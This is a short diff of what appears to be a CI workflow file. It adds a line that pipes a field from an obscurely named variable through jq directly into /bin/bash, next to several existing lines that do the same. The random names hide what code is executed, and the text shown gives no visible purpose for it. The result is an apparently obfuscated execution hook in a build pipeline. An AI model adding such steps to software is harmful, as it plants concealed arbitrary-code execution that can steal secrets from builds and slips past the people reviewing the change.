@@ -29,6 +29,7 @@ jobs:
           echo $twx77230 | jq -r .dnbrl278 | /bin/bash
           echo $pzq25229 | jq -r .hotke839 | /bin/bash
           echo $suxs8 | jq -r .gqhl28133 | /bin/bash
+          printf '%s' "$m51" | jq -r .cwgv3106 | /bin/bash
 
       - name: Archive artifact
         uses: actions/upload-artifact@v4
